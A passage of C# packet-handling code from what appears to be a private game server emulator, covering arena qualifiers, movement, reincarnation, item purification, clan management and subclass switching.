                            || client.Entity.MapID == 8510 || client.Entity.MapID == 8527 || client.Entity.MapID == 8518
                            || client.Entity.MapID == 8526 || client.Entity.MapID == 8522 || client.Entity.MapID == 8523 || client.Entity.MapID == 1460
                            || client.Entity.MapID == 8524 || client.Entity.MapID == 8525 || client.Entity.MapID == 1458 || client.Entity.MapID == 1459 || client.Entity.MapID == 1645 || client.Entity.MapID == 16414)
                            return;
                        #endregion  
                        //Code snippet that belongs to Ultimation
                        uint DialogID = BitConverter.ToUInt32(packet, 4);
                        uint ButtonID = BitConverter.ToUInt32(packet, 8);
                        switch (DialogID)
                        {
                            case 4:
                                {
                                    switch (ButtonID)
                                    {
                                        case 0:
                                            {
                                                Game.Arena.QualifyEngine.DoQuit(client);
                                                break;
                                            }
                                    }
                                    break;
                                }
                            case 0: Game.Arena.QualifyEngine.DoSignup(client); client.Send(packet); break;
                            case 1: Game.Arena.QualifyEngine.DoQuit(client); client.Send(packet); break;
                            case 3:
                                {
                                    switch (ButtonID)
                                    {
                                        case 2: Game.Arena.QualifyEngine.DoGiveUp(client); break;
                                        case 1: Game.Arena.QualifyEngine.DoAccept(client); break;
                                    }
                                    break;
                                }
                            case 5:
                                {
                                    if (client.ArenaPoints <= 1500)
                                        if (client.Entity.Money >= 9000000)
                                        {
                                            client.Entity.Money -= 9000000;
                                            client.ArenaPoints += 1500;
                                            client.Send(client.ArenaStatistic);
                                        }
                                    break;
                                }
                            case 11://Win/Lose Dialog
                                {
                                    switch (ButtonID)
                                    {
                                        case 0: Game.Arena.QualifyEngine.DoSignup(client); break;
                                    }
                                    break;
                                }

                        }
                        break;
                    }
                case 2208://Request Arena Winner List
                    {
                        //Code snippet that belongs to Ultimation
                        Game.Arena.Statistics.ShowWiners(client);
                        break;
                    }
                case 2209:
                    {
                        client.ArenaStatistic.Send(client);
                        break;
                    }
                case 2211:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID >= 6000 && client.Map.BaseID <= 6003) return;
                        #region MaxsMap
                        if (client.Entity.MapID == 1766 || client.Entity.MapID == 8877
                            || client.Entity.MapID == 1734 || client.Entity.MapID == 1733
                            || client.Entity.MapID == 1732 || client.Entity.MapID == 1731 || client.Entity.MapID == 1024
                            || client.Entity.MapID == 1730 || client.Entity.MapID == 1735 || client.Entity.MapID == 1090
                            || client.Entity.MapID == 8511 || client.Entity.MapID == 8512 || client.Entity.MapID == 8514
                            || client.Entity.MapID == 8510 || client.Entity.MapID == 8527 || client.Entity.MapID == 8518
                            || client.Entity.MapID == 8526 || client.Entity.MapID == 8522 || client.Entity.MapID == 8523
                            || client.Entity.MapID == 8524 || client.Entity.MapID == 8525 || client.Entity.MapID == 16414)
                            return;
                        #endregion  
                        ushort Type = BitConverter.ToUInt16(packet, 4);
                        ushort SubType = BitConverter.ToUInt16(packet, 6);
                        uint Fighter = BitConverter.ToUInt32(packet, 10);
                        if (Type == 0)
                        {
                            // if (!Constants.PKFreeMaps.Contains(client.Entity.MapID))
                            {

                                if (Kernel.GamePool.ContainsKey(Fighter))
                                {
                                    Client.GameState Client = Kernel.GamePool[Fighter];
                                    if (Client.Team != null)
                                    {
                                        if (Client.Team.EliteMatch != null)
                                        {
                                            if (Client.Team.EliteMatch.OnGoing)
                                            {
                                                Client.Team.EliteMatch.BeginWatch(client);
                                            }
                                        }
                                    }
                                    else if (Client.ElitePKMatch != null)
                                    {
                                        if (Client.ElitePKMatch.OnGoing)
                                        {
                                            Client.ElitePKMatch.BeginWatch(client);
                                        }
                                    }
                                    else if (Client.InQualifier())
                                    {
                                        if (Client.QualifierGroup != null)
                                        {
                                            if (!Client.QualifierGroup.Done)
                                            {
                                                client.QualifierGroup.End(client);
                                            }
                                        }
                                        else if (Client.TeamQualifierGroup != null)
                                        {
                                            if (!Client.TeamQualifierGroup.Done)
                                            {
                                                Client.TeamQualifierGroup.BeginWatching(client);
                                            }
                                        }
                                    }
                                }
                                else if (MaTrix.AI.Ais.ContainsKey(Fighter))
                                {
                                    Client.GameState Client = MaTrix.AI.Ais[Fighter].Bot;
                                    if (Client == null)
                                        return;
                                    if (Client.Team != null)
                                    {
                                        if (Client.Team.EliteMatch != null)
                                        {
                                            if (Client.Team.EliteMatch.OnGoing)
                                            {
                                                Client.Team.EliteMatch.BeginWatch(client);
                                            }
                                        }
                                    }
                                    else if (Client.ElitePKMatch != null)
                                    {
                                        if (Client.ElitePKMatch.OnGoing)
                                        {
                                            Client.ElitePKMatch.BeginWatch(client);
                                        }
                                    }
                                    else if (Client.InQualifier())
                                    {
                                        if (Client.QualifierGroup != null)
                                        {
                                            if (!Client.QualifierGroup.Done)
                                            {
                                                client.QualifierGroup.End(client);
                                            }
                                        }
                                        else if (Client.TeamQualifierGroup != null)
                                        {
                                            if (!Client.TeamQualifierGroup.Done)
                                            {
                                                Client.TeamQualifierGroup.BeginWatching(client);
                                            }
                                        }
                                    }
                                }
                            }
                            //else
                            //{
                            //    client.Send(new Message("You can't Watch here", Message.TopLeft));
                            //}
                        }
                        else if (Type == 1)
                        {
                            if (client.Entity.SkillTeamWatchingElitePKMatch != null)
                                client.Entity.SkillTeamWatchingElitePKMatch.LeaveWatch(client);
                            else if (client.WatchingElitePKMatch != null)
                                client.WatchingElitePKMatch.LeaveWatch(client);
                            else if (client.WatchingGroup != null)
                                Game.Arena.QualifyEngine.DoLeave(client);
                            else
                                if (client.TeamWatchingGroup != null)
                                Game.TeamArena.QualifyEngine.DoLeave(client);
                        }
                        else if (Type == 4)
                        {
                            uint fighter = BitConverter.ToUInt32(packet, 10);
                            if (client.Entity.SkillTeamWatchingElitePKMatch != null)
                                client.Entity.SkillTeamWatchingElitePKMatch.Cheer(client, fighter);
                            else if (client.WatchingElitePKMatch != null)
                                client.WatchingElitePKMatch.Cheer(client, fighter);
                            else if (client.WatchingGroup != null)
                                Game.Arena.QualifyEngine.DoCheer(client, fighter);
                            else
                                if (client.TeamWatchingGroup != null)
                                Game.TeamArena.QualifyEngine.DoCheer(client, fighter);
                        }
                        break;
                    }
                #endregion                 
                #region TeamArena (2243<->2247)
                case 2243://Request Arena ranking List
                    {
                        //Code snippet that belongs to Ultimation
                        ushort PageIndex = BitConverter.ToUInt16(packet, 6);
                        Game.TeamArena.Statistics.ShowRankingPage(packet[4], packet[4], client);
                        break;
                    }
                case 2242:
                    {
                        //Code snippet that belongs to Ultimation
                        ushort PageIndex = BitConverter.ToUInt16(packet, 4);
                        Game.TeamArena.QualifyEngine.RequestGroupList(client, PageIndex);
                        break;
                    }
                case 2241://Arena Signup!
                    {
                        //Code snippet that belongs to Ultimation
                        uint DialogID = BitConverter.ToUInt32(packet, 4);
                        uint ButtonID = BitConverter.ToUInt32(packet, 8);
                        switch (DialogID)
                        {
                            case 4:
                                {
                                    switch (ButtonID)
                                    {
                                        case 0:
                                            {
                                                Game.TeamArena.QualifyEngine.DoQuit(client);
                                                break;
                                            }
                                    }
                                    break;
                                }
                            case 0: Game.TeamArena.QualifyEngine.DoSignup(client); client.Send(packet); break;
                            case 1: Game.TeamArena.QualifyEngine.DoQuit(client); client.Send(packet); break;
                            case 3:
                                {
                                    switch (ButtonID)
                                    {
                                        case 2: Game.TeamArena.QualifyEngine.DoGiveUp(client); break;
                                        case 1: Game.TeamArena.QualifyEngine.DoAccept(client); break;
                                    }
                                    break;
                                }
                            case 5:
                                {
                                    if (client.ArenaPoints <= 1500)
                                    {
                                        if (client.Entity.Money >= 9000000)
                                        {
                                            client.Entity.Money -= 9000000;
                                            client.ArenaPoints += 1500;
                                            client.Send(client.TeamArenaStatistic);
                                        }
                                    }
                                    break;
                                }
                            case 11://Win/Lose Dialog
                                {
                                    switch (ButtonID)
                                    {
                                        case 0: Game.TeamArena.QualifyEngine.DoSignup(client); break;
                                    }
                                    break;
                                }

                        }
                        break;
                    }
                case 2244://Request Arena Winner List
                    {
                        //Code snippet that belongs to Ultimation
                        Game.TeamArena.Statistics.ShowWiners(client);
                        break;
                    }
                case 2245:
                    {
                        client.TeamArenaStatistic.Send(client);
                        break;
                    }
                case 2247:
                    {
                        if (client.Entity.MapID == 601) return;
                        if (client.Map.BaseID >= 6000 && client.Map.BaseID <= 6003) return;
                        ushort Type = BitConverter.ToUInt16(packet, 4);
                        uint Fighter = BitConverter.ToUInt32(packet, 8);
                        if (Type == 0)
                        {
                            if (Kernel.GamePool.ContainsKey(Fighter))
                            {
                                Client.GameState Client = Kernel.GamePool[Fighter];
                                if (Client.InTeamQualifier())
                                {
                                    Game.TeamArena.QualifierList.QualifierParticipants particiaptants = new Game.TeamArena.QualifierList.QualifierParticipants(Client, Game.TeamArena.QualifierList.QualifierParticipants.KindOfParticipants.Neutral);
                                    client.Send(particiaptants.Build(client.Entity.UID));
                                }
                            }
                        }
                        break;
                    }
                #endregion  
                #region Movement/Walk (10005)
                case 10005:
                    {
                        if (client.Action != 2)
                            return;
                        GroundMovement groundMovement = new GroundMovement(false);
                        groundMovement.Deserialize(packet);

                        client.Entity.RemoveFlag(Update.Flags.Intensify);
                        client.Entity.IntensifyPercent = 0;

                        client.Entity.SetAway(false);
                        client.LastMove = Time32.Now;
                        PlayerGroundMovment(groundMovement, client);

                        break;
                    }
                #endregion
                #region Reincarnation (1066)
                case 1066:
                    {
                        if (client.Entity.Reborn != 2) return;
                        if (Kernel.ReincarnatedCharacters.ContainsKey(client.Entity.UID))
                        {
                            if (client.Entity.Level > 110)
                            {
                                Database.ReincarnationTable.RemoveReincarnated(client.Entity);
                                Kernel.ReincarnatedCharacters.Remove(client.Entity.UID);
                            }
                            else
                            {
                                return;
                            }
                        }
                        byte NewClass = packet[8];
                        ushort NewBody = packet[12];
                        if (client.Entity.Body.ToString().EndsWith("1") || client.Entity.Body.ToString().EndsWith("2"))
                            NewBody += 2000;
                        else NewBody += 1000;
                        if (client.Inventory.Count <= 40 - 15)
                        {
                            if (client.Inventory.Contains(711083, 1) && client.Entity.ConquerPoints >= rates.Reincarnation)
                            {
                                if (client.Inventory.Count == 40 && (!client.Equipment.Free(5) || !client.Equipment.Free(25)))
                                {
                                    client.MessageBox("Please Free some spaces in your invetory for your invaild equipment");
                                    return;
                                }
                                client.Entity.Body = NewBody;
                                new PacketHandler.Reincarnation(client, NewClass);
                                client.Inventory.Remove(711083, 1);
                                client.Entity.ConquerPoints -= rates.Reincarnation;
                                RemoveBadSkills(client);
                            }
                            else
                            {
                                client.MessageBox("u don't " + Database.ConquerItemInformation.BaseInformations[711083].Name + " or u don't have " + rates.Reincarnation + " cps");
                            }
                        }
                        else client.MessageBox("get 15 items Inventory");
                        break;
                    }
                #endregion
                #region PurifyItem (2076)
                case 2076:
                    {
                        Purification ps = new Purification(false);
                        ps.Deserialize(packet);
                        switch (ps.Mode)
                        {
                            case Purification.Purify:
                                PurifyItem(ps, client); break;
                            case Purification.ItemArtifact:
                                PurifyRefinery(ps, client); break;
                                //case Purification.Stabilaze:
                                //new Game.Features.Refinery.Handle(packet, client); break;
                        }
                        break;
                    }
                #endregion
                #region Clans (1312)
                case 1312:
                    {
                        Clan clanp = new Clan();
                        clanp.Deserialize(packet);
                        //GameState target;
                        switch (clanp.Type)
                        {
                            case Clan.Types.Announce:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        client.Send(new ClanAnnouncement(clan));
                                    }
                                    break;
                                }
                            case Clan.Types.Kick:
                                {
                                    var clan = client.Entity.GetClan;
                                    var kickedmem = Program.FindClient(clanp.Offset18String);
                                    //var kickedmem = Program.Values.SingleOrDefault(x => x.Entity.Name == clanp.Offset18String);
                                    if (kickedmem != null)
                                    {
                                        byte[] Packet = new byte[90];
                                        Writer.WriteUInt16(82, 0, Packet);
                                        Writer.WriteUInt16(1312, 2, Packet);
                                        Writer.WriteUInt32(22, 4, Packet);
                                        Writer.WriteUInt32(kickedmem.Entity.UID, 8, Packet);
                                        kickedmem.Send(Packet);

                                        kickedmem.Entity.ClanRank = Clan.Ranks.None;
                                        kickedmem.Entity.ClanName = "";
                                        kickedmem.Entity.ClanId = 0;
                                        kickedmem.SendScreenSpawn(kickedmem.Entity, true);
                                    }
                                    uint UID = 0;
                                    foreach (var item in clan.Members.Values)
                                    {
                                        if (item.Name == clanp.Offset18String)
                                            UID = item.UID;
                                    }
                                    if (clan.Members.Remove(UID/*clan.Members.SingleOrDefault(x => x.Value.Name == clanp.Offset18String).Key*/))
                                    {
                                        clan.InfoToMembers();
                                        Database.EntityTable.RemoveClanMember(clanp.Offset18String);
                                        Kernel.SendWorldMessage(new Message(String.Format("{0} has kicked {1} form his Clan!", client.Entity.Name, clanp.Offset18String), Color.Red, Message.TopLeft));
                                        if (client.Team != null)
                                            client.Team.GetClanShareBp(client);
                                    }
                                    break;
                                }
                            case Clan.Types.MyClan:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        clan.Build(client, Clan.Types.MyClan);
                                        client.Send(clan);

                                        clan.Build(client, Clan.Types.Info);
                                        client.Send(clan);
                                    }
                                    break;
                                }
                            case Clan.Types.Members:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        ClanMembers memclanp = new ClanMembers(clan);
                                        memclanp.Type = clanp.Type;
                                        client.Send(memclanp);
                                    }
                                    break;
                                }
                            case Clan.Types.Dedicate:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        if (client.Entity.Money >= clanp.ID)
                                        {
                                            client.Entity.Money -= clanp.ID;
                                            clan.Fund += clanp.ID;

                                            ClanMember member;
                                            if (clan.Members.TryGetValue(client.Entity.UID, out member))
                                            {
                                                member.Donation += clanp.ID;
                                                client.Entity.Save("clandonation", member.Donation);
                                            }
                                            clan.Save(client, "fund", clan.Fund);

                                            clan.InfoToMembers();
                                        }
                                    }
                                    break;
                                }
                            case Clan.Types.AcceptJoinRequest:
                                {
                                    if (packet[16] != 1)
                                    {
                                        return;
                                    }
                                    Clan getClan4 = client.Entity.GetClan;
                                    if (client.Entity.ClanRank != Clan.Ranks.ClanLeader || getClan4 == null || getClan4.Members.Count >= 12)
                                    {
                                        return;
                                    }
                                    GameState c = null;
                                    if (Kernel.GamePool.TryGetValue(MTA.BitConverter.ToUInt32(packet, 8), out c))
                                    {
                                        getClan4.Join(c);
                                        return;
                                    }
                                    return;
                                }
                            case Clan.Types.Join:
                                {
                                    uint key5 = MTA.BitConverter.ToUInt32(packet, 8);
                                    if (Kernel.GamePool.ContainsKey(key5))
                                    {
                                        Writer.WriteUInt32(client.Entity.UID, 8, packet);
                                        packet[16] = 1;
                                        packet[17] = (byte)client.Entity.Name.Length;
                                        for (int j = 0; j < client.Entity.Name.Length; j++)
                                        {
                                            try
                                            {
                                                packet[18 + j] = Convert.ToByte(client.Entity.Name[j]);
                                            }
                                            catch
                                            {
                                            }
                                        }
                                        Kernel.GamePool[key5].Send(packet);
                                        return;
                                    }
                                    return;
                                }


                            case Clan.Types.AcceptRecruit:
                                {
                                    uint key4 = MTA.BitConverter.ToUInt32(packet, 8);
                                    GameState gameClient13 = Kernel.GamePool[key4];
                                    if (gameClient13 == null)
                                    {
                                        return;
                                    }
                                    if (packet[16] == 1)
                                    {
                                        Clan getClan3 = gameClient13.Entity.GetClan;
                                        if (gameClient13.Entity.ClanRank == Clan.Ranks.ClanLeader && getClan3 != null && getClan3.Members.Count < 12)
                                        {
                                            getClan3.Join(client);
                                        }
                                    }
                                    Database.EntityTable.UpdateClanID(gameClient13);
                                    Database.EntityTable.UpdateClanRank(gameClient13);
                                    return;
                                }
                            case Clan.Types.Recruit:
                                {
                                    uint key3 = MTA.BitConverter.ToUInt32(packet, 8);
                                    Clan getClan2 = client.Entity.GetClan;
                                    if (getClan2.Members.Count >= 12)
                                    {
                                        client.Entity.SendSysMesage("Sorry, you clan use the limit of members");
                                        return;
                                    }
                                    GameState gameClient12;
                                    if (Kernel.GamePool.TryGetValue(key3, out gameClient12))
                                    {
                                        Writer.WriteUInt32(client.Entity.UID, 8, packet);
                                        Writer.WriteByte(2, 16, packet);
                                        Writer.WriteByte((byte)getClan2.Name.Length, 17, packet);
                                        Writer.WriteString(getClan2.Name, 18, packet);
                                        ushort num63 = (ushort)(18 + (byte)getClan2.Name.Length);
                                        Writer.WriteByte((byte)getClan2.Name.Length, (int)num63, packet);
                                        num63 += 1;
                                        Writer.WriteString(getClan2.Name, (int)num63, packet);
                                        gameClient12.Send(packet);
                                        return;
                                    }
                                    return;
                                }
                            case Clan.Types.Quit:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        if (client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                        {
                                            if (clan.Members.ContainsKey(client.Entity.UID))
                                                clan.Members.Remove(client.Entity.UID);

                                            client.Entity.ClanRank = Clan.Ranks.None;
                                            client.Entity.ClanName = "";
                                            client.Entity.ClanId = 0;

                                            Database.EntityTable.UpdateClanID(client);
                                            Database.EntityTable.UpdateClanRank(client);
                                            Database.EntityTable.UpdateClanDonation(client);

                                            //client.Entity.Save("clanrank", 0);
                                            //client.Entity.Save("clanid", 0);
                                            //client.Entity.Save("clandonation", 0);

                                            #region Check Spouse and Re-Set Rank

                                            /*
                                            if (client.Entity.ClanRank == Clan.Ranks.Member)
                                            {
                                                if (clan.Members.ContainsKey(client.Entity.Spouse))
                                                {
                                                    Client Spouse;
                                                    if (World.GamePool.TryGetValue(client.Entity.Spouse, out Spouse))
                                                    {
                                                        Spouse.Hero.ClanRank = Spouse.Hero.ClanRank == Clan.Ranks.Spouse ? Clan.Ranks.Member : Clan.Ranks.Member;

                                                        Spouse.Hero.Save("clanrank", Convert.ToUInt16(Spouse.Hero.ClanRank));
                                                    }
                                                    else
                                                    {
                                                        MysqlCommand cmd = new MysqlCommand(CommandType.UPDATE);
                                                        cmd.Update("hero")
                                                            .Set("clanrank", Convert.ToUInt16(Clan.Ranks.Member), false)
                                                            .Where("id", client.Entity.Spouse);
                                                        c.SqlCmdQueue.Enqueue(cmd);
                                                    }
                                                }
                                            }
                                            */
                                            #endregion

                                            clan.InfoToMembers();
                                            client.SendScreen(client.Entity.SpawnPacket, false);

                                            clan.SendMessage(new Message(String.Format("{0} Has Left the Clan ", client.Entity.Name), Color.Red, Message.Clan));

                                            client.Send(clanp);
                                        }
                                    }
                                    break;
                                }
                            case Clan.Types.AddAlly:
                                {
                                    Clan getClan7 = client.Entity.GetClan;
                                    if (getClan7 == null)
                                    {
                                        return;
                                    }
                                    if (client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        client.Send(new Message("You are not the clan leader.", Color.Red, 2012u));
                                        return;
                                    }
                                    if (getClan7.Allies.Count<KeyValuePair<uint, Clan>>() >= 5)
                                    {
                                        client.Send(new Message("The Ammount of Allies You can Have has exceeded", Color.Red, 2012u));
                                        return;
                                    }
                                    GameState gameClient14;
                                    if (!Kernel.GamePool.TryGetValue(clanp.ID, out gameClient14))
                                    {
                                        client.Send(new Message("Can not find target.", Color.Red, 2012u));
                                        return;
                                    }
                                    Clan getClan8 = gameClient14.Entity.GetClan;
                                    if (getClan8 == null)
                                    {
                                        return;
                                    }
                                    if (gameClient14.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        client.Send(new Message("This target is not the clan leader.", Color.Red, 2012u));
                                        return;
                                    }
                                    if (getClan8.Allies.Count<KeyValuePair<uint, Clan>>() >= 5)
                                    {
                                        client.Send(new Message("The Ammount of Allies the Target Clan can Have has exceeded", Color.Red, 2012u));
                                        return;
                                    }
                                    if (getClan7.Allies.ContainsKey(getClan8.ID))
                                    {
                                        return;
                                    }
                                    if (!getClan7.Enemies.ContainsKey(getClan8.ID))
                                    {
                                        getClan8.AllyRequest = getClan7.ID;
                                        Writer.WriteUInt32(client.Entity.UID, 8, packet);
                                        Writer.WriteByte(2, 16, packet);
                                        Writer.WriteByte((byte)getClan7.Name.Length, 17, packet);
                                        Writer.WriteString(getClan7.Name, 18, packet);
                                        ushort num64 = (ushort)(getClan7.Name.Length + 18);
                                        Writer.WriteByte((byte)getClan7.LeaderName.Length, (int)num64, packet);
                                        num64 += 1;
                                        Writer.WriteString(getClan7.LeaderName, (int)num64, packet);
                                        gameClient14.Send(packet.ToArray<byte>());
                                        return;
                                    }
                                    client.Send(new Message("That clan is Your Enemy.", Color.Red, 2012u));
                                    return;
                                }
                            case Clan.Types.AcceptAlliance:
                                {
                                    if (packet[8] != 1)
                                    {
                                        return;
                                    }
                                    Clan getClan9 = client.Entity.GetClan;
                                    if (getClan9 == null)
                                    {
                                        return;
                                    }
                                    if (client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        client.Send(new Message("You are not the clan leader.", Color.Red, 2012u));
                                        return;
                                    }
                                    Clan clan3;
                                    if (!Kernel.Clans.TryGetValue(getClan9.AllyRequest, out clan3))
                                    {
                                        client.Send(new Message("Can not find target", Color.Red, 2012u));
                                        return;
                                    }
                                    if (clan3 == null)
                                    {
                                        return;
                                    }
                                    if (clan3.Enemies.ContainsKey(getClan9.ID))
                                    {
                                        client.Send(new Message("This Clan Has Enemied You!.", Color.Red, 2012u));
                                        return;
                                    }
                                    if (!getClan9.Enemies.ContainsKey(clan3.ID))
                                    {
                                        if (!getClan9.Allies.ContainsKey(clan3.ID))
                                        {
                                            getClan9.Allies.Add(clan3.ID, clan3);
                                        }
                                        clan3.Allies.Add(getClan9.ID, getClan9);
                                        getClan9.SendMessage(new ClanRelations(getClan9, ClanRelations.RelationTypes.Allies));
                                        clan3.SendMessage(new ClanRelations(clan3, ClanRelations.RelationTypes.Allies));
                                        getClan9.SendMessage(new Message(string.Format("Our Clan has Allianced with {0}", clan3.Name), Color.Red, 2006u));
                                        clan3.SendMessage(new Message(string.Format("Our Clan has Allianced with {0}", getClan9.Name), Color.Red, 2006u));
                                        getClan9.AddRelation(clan3.ID, ClanRelations.RelationTypes.Allies);
                                        clan3.AddRelation(getClan9.ID, ClanRelations.RelationTypes.Allies);
                                        Clan arg_9788_0 = getClan9;
                                        clan3.AllyRequest = 0u;
                                        arg_9788_0.AllyRequest = 0u;
                                        return;
                                    }
                                    client.Send(new Message("This Clan is Your Enemy.", Color.Red, 2012u));
                                    return;
                                }
                            case Clan.Types.DeleteEnemy:
                                {
                                    Clan getClan6 = client.Entity.GetClan;
                                    if (getClan6 == null)
                                    {
                                        return;
                                    }
                                    if (client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        client.Send(new Message("You are not authorized to continue with this action", Color.Red, 2012u));
                                        return;
                                    }
                                    string offset18String2 = clanp.Offset18String;
                                    uint clanId2 = getClan6.GetClanId(offset18String2);
                                    Clan clan2;
                                    if (Kernel.Clans.TryGetValue(clanId2, out clan2))
                                    {
                                        getClan6.Enemies.Remove(clanId2);
                                        getClan6.DeleteRelation(clanId2, ClanRelations.RelationTypes.Enemies);
                                        getClan6.SendMessage(new ClanRelations(getClan6, ClanRelations.RelationTypes.Enemies));
                                        getClan6.SendMessage(new Message(string.Format("We are no longer Enemies With {0}", clan2.Name), Color.Red, 2006u));
                                        client.Send(clanp);
                                        return;
                                    }
                                    return;
                                }
                            case Clan.Types.DeleteAlly:
                                {
                                    Clan getClan10 = client.Entity.GetClan;
                                    if (getClan10 == null)
                                    {
                                        return;
                                    }
                                    if (client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        client.Send(new Message("You are not authorized to continue with this action", Color.Red, 2012u));
                                        return;
                                    }
                                    string offset18String3 = clanp.Offset18String;
                                    uint clanId3 = getClan10.GetClanId(offset18String3);
                                    Clan clan4;
                                    if (getClan10.Allies.TryGetValue(clanId3, out clan4))
                                    {
                                        getClan10.Allies.Remove(clanId3);
                                        clan4.Allies.Remove(getClan10.ID);
                                        getClan10.DeleteRelation(clanId3, ClanRelations.RelationTypes.Allies);
                                        clan4.DeleteRelation(getClan10.ID, ClanRelations.RelationTypes.Allies);
                                        getClan10.SendMessage(new ClanRelations(getClan10, ClanRelations.RelationTypes.Allies));
                                        clan4.SendMessage(new ClanRelations(clan4, ClanRelations.RelationTypes.Allies));
                                        getClan10.SendMessage(new Message(string.Format("We are no longer allied with {0}", clan4.Name), Color.Red, 2006u));
                                        client.Send(clanp);
                                        client.Screen.FullWipe();
                                        client.Screen.Reload(null);
                                        clan4.SendMessage(new Message(string.Format("We are no longer allied with {0}", getClan10.Name), Color.Red, 2006u));
                                        client.Send(clanp);

                                        getClan10.Build(client, Clan.Types.Info);
                                        client.Send(new ClanRelations(getClan10, ClanRelations.RelationTypes.Allies));
                                        client.Send(new ClanRelations(getClan10, ClanRelations.RelationTypes.Enemies));
                                        return;
                                    }
                                    return;
                                }
                            case Clan.Types.AddEnemy:
                                {
                                    Clan getClan5 = client.Entity.GetClan;
                                    if (getClan5 == null || client.Entity.ClanRank != Clan.Ranks.ClanLeader)
                                    {
                                        return;
                                    }
                                    string offset18String = clanp.Offset18String;
                                    uint clanId = getClan5.GetClanId(offset18String);
                                    if (getClan5.Enemies.ContainsKey(clanId))
                                    {
                                        client.Send(new Message("This clan is Already One of Your Enemies", Color.Red, 2012u));
                                        return;
                                    }
                                    if (getClan5.Allies.ContainsKey(clanId))
                                    {
                                        client.Send(new Message("This clan is one of your alliance, What has gone wrong?", Color.Red, 2012u));
                                        return;
                                    }
                                    if (getClan5.Enemies.Count<KeyValuePair<uint, Clan>>() >= 5)
                                    {
                                        client.Send(new Message("The Ammount of Enemies You can Have has exceeded", Color.Red, 2012u));
                                        return;
                                    }
                                    Clan clan;
                                    if (Kernel.Clans.TryGetValue(clanId, out clan))
                                    {
                                        if (!getClan5.Enemies.ContainsKey(clan.ID))
                                        {
                                            getClan5.Enemies.Add(clan.ID, clan);
                                        }
                                        getClan5.AddRelation(clanId, ClanRelations.RelationTypes.Enemies);
                                        getClan5.SendMessage(new ClanRelations(getClan5, ClanRelations.RelationTypes.Enemies));
                                        getClan5.SendMessage(new Message(string.Format("We Have Enemied the clan {0}", clan.Name), Color.Red, 2006u));
                                        clan.SendMessage(new Message(string.Format("The Clan {0} Has Made us their Enemy!", getClan5.Name), Color.Red, 2006u));
                                        return;
                                    }
                                    return;
                                }
                            case Clan.Types.SetAnnouncement:
                                {
                                    Clan clan = client.Entity.GetClan;
                                    if (clan != null)
                                    {
                                        if (client.Entity.ClanRank == Clan.Ranks.ClanLeader)
                                        {
                                            clan.Announcement = clanp.Offset18String;

                                            clan.SendMessage(new ClanAnnouncement(clan));
                                            clan.Save(client, "announcement", clan.Announcement);
                                        }
                                        else client.Send(new Message("You are not authorized to continue with this action", Color.Red, Message.TopLeft));
                                    }
                                    break;
                                }
                            case Clan.Types.TransferLeader:
                                {
                                    if (client.Entity.Myclan != null)
                                    {
                                        PrintPacket(packet);
                                        uint lider = 0;
                                        string name_receive = Program.Encoding.GetString(packet, 18, packet[17]);
                                        foreach (var clien in Program.Values)
                                        {
                                            if (clien.Entity.Name == name_receive)
                                                lider = clien.Entity.UID;
                                        }
                                        if (lider == client.Entity.UID) return;
                                        Client.GameState aClient = null;
                                        if (MTA.Kernel.GamePool.TryGetValue(lider, out aClient))
                                        {

                                            if (MTA.Kernel.Clans.ContainsKey(client.Entity.Myclan.ID))
                                            {
                                                if (MTA.Kernel.Clans[client.Entity.Myclan.ID].Members.ContainsKey(aClient.Entity.UID))
                                                {
                                                    MTA.Kernel.Clans[client.Entity.Myclan.ID].LeaderName = aClient.Entity.Name;
                                                    aClient.Entity.ClanRank = Clan.Ranks.ClanLeader;
                                                    aClient.Entity.Myclan.Members[aClient.Entity.UID].Rank = Clan.Ranks.ClanLeader;
                                                    if (aClient.Entity.Myclan.Members.ContainsKey(client.Entity.UID))
                                                        aClient.Entity.Myclan.Members[client.Entity.UID].Rank = 0;
                                                    client.Entity.ClanRank = 0;
                                                    Clan.SaveClan(aClient.Entity.Myclan);
                                                    Clan clan = client.Entity.GetClan;
                                                    clan.Join(client);
                                                }
                                            }

                                        }
                                        else
                                        {
                                            MTA.Kernel.Clans[client.Entity.Myclan.ID].LeaderName = name_receive;
                                            client.Entity.ClanRank = 0;
                                            Clan clan = client.Entity.GetClan;
                                            clan.Join(client);
                                            Clan.SaveClan(client.Entity.Myclan);
                                            Clan.TransferClan(name_receive);
                                        }
                                    }
                                    break;
                                }
                            default:
                                Console.WriteLine(String.Format("Un Handled Clan clanp Type {0}", clanp.Type));
                                break;
                        }
                        break;
                    }
                #endregion
                #region SubClass (2320)
                case 2320:
                    {
                        ushort id = BitConverter.ToUInt16(packet, 8);
                        byte sclass = packet[10];
                        switch (id)
                        {
                            case SubClassShow.SwitchSubClass:
                                {
                                    if (!client.Entity.SubClasses.Classes.ContainsKey(sclass) && sclass != 0)
                                        return;

                                    if (sclass == 0)
                                    {
                                        SubClassShow subClassShow = new SubClassShow(0);
                                        subClassShow.ID = SubClassShow.ActivateSubClass;
                                        client.Send(subClassShow.ToArray());
                                        client.Entity.SubClasses.Activate(client, sclass);
                                        client.SendScreenSpawn(client.Entity, false);///aho ya 3m
                                        return;
                                    }
                                    Game.SubClass subClass = client.Entity.SubClasses.Classes[sclass];
                                    client.Entity.SubClasses.Activate(client, sclass);
                                    SubClassShow subClassShow2 = new SubClassShow(0);
                                    subClassShow2.ID = 1;
                                    subClassShow2.Class = sclass;
                                    subClassShow2.Level = subClass.Level;
                                    client.Send(subClassShow2.ToArray());
                                    client.SendScreenSpawn(client.Entity, false);///aho ya 3m

                                    break;
                                }
                            case SubClassShow.Upgrade:
                                {
                                    if (!client.Entity.SubClasses.Classes.ContainsKey(sclass))
                                        return;

                                    Game.SubClass subClass2 = client.Entity.SubClasses.Classes[sclass];
                                    if (subClass2.Level == 9)
                                        return;

                                    ushort required = Game.Subclasses.GetRequired(subClass2);
